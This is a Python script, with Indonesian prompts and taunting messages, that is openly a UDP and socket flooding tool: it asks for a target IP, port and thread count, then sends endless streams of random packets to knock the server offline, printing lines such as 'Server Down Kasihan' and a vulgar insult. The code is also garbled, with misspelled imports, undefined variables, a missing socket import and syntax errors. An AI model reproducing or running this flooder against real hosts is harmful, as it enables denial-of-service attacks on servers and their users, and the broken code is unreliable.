import os
import choice
import theards
import random
import times

 os.system("clear")
 print("""\033[070m
 
 
 
╔═╗─╔╗──────╔╗
║║╚╗║║──────║║
║╔╗╚╝╠══╦╗─╔╣╚═╦══╦══╗
║║╚╗║║╔╗║║─║║╔╗║╔╗║║═╣
║║─║║║╔╗║╚═╝║╚╝║╔╗║║═╣
╚╝─╚═╩╝╚╩═╗╔╩══╩╝╚╩══╝
────────╔═╝║
────────╚══╝
 
 
                         """)
print("""\033[090
ip = str(input(" Masukan Ip Target "  ;))
port = int(input(" Masukan Port Target " ;))
choice = str(input(" Masukan Udp Y/N "  ;))
theards = int(input(" Masukan Packets Terserah "  ;))
times = int(input(" Masukan Theards Terserah "  ;)
)


def naybae():
    data = random._urandom(1024)
    i = random.choice(("[naybae]","[naybae]","[naybae]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for z in range(time):
                s.sendto(data,addr)
            print(i +" | Tok.. Tok.. Paket dari WillardZy |")
        except:
            print("[!] | Server Down Kasihan !!!!! |")

def naybae2():
    data = random._urandom(16)
    i = random.choice(("[naybae]","[naybae]","[naybae]"))
    while True:
        try:
            s = socket.socket(socket.AF_INIT, socket.SOCK_DGRAM)
            s.connect((ip,port))
            s.send(data)
            for z in range(time):
                s.send(data)
            print(i +"| WillardZy nih bwang... |")
        except:
            s.close()
            print("[*] | Down lagi kontol.... |")
            
 for a in range(threds):
    if choice == "y":
        th = threading.Thread(target = naybae)
        th.start()
    else:
        th = threading.Thread(target = naybae2)
        th.start
